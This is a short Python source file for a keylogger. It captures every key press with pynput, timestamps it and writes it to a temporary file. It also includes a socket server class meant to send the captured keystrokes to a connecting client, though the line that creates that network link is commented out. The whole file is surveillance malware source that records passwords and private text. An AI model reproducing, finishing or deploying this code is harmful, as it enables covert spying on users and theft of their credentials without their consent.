import socket
import tempfile
import time

from pynput.keyboard import Listener, Key


def now_time(): return time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())


class logger:
    isStop = False

    def __init__(self):
        # self.NET = network(("127.0.0.1",59487))
        self.TEMPFILE = tempfile.NamedTemporaryFile(mode="w+b")


    def on_release(self, key):
        try:
            if key.name == 'scroll_lock' or self.isStop:
                print("End logging")
                return False
        except AttributeError:
            pass

    def on_press(self, key):
        self.write("[{}][{}]".format(now_time(), str(key).replace("'", "")))
        print("[{}][{}]".format(now_time(), str(key).replace("'", "")))

    def write(self, string):
        self.TEMPFILE.write(bytes(string,encoding="utf-8"))

    def send(self, msg):
        self.NET.send(msg)
        pass

    def start(self):
        self.isStop = False
        print("Start logging")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def stop(self):
        self.isStop = True



class network:
    def __init__(self, IP: tuple):
        self.sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sockfd.bind(IP)
        self.sockfd.listen(1)
        self.conn, self.addr = self.sockfd.accept()
        print(f"Connected by {self.addr}")

    def send(self, byte: bytes):
        self.conn.sendall(byte)
        print(f"I sent {len(byte)} bytes data")

    def close(self):
        print(f"Disconnected by {self.addr}")
        self.conn.shutdown(socket.SHUT_RDWR)
        self.conn.close()
        self.sockfd.close()
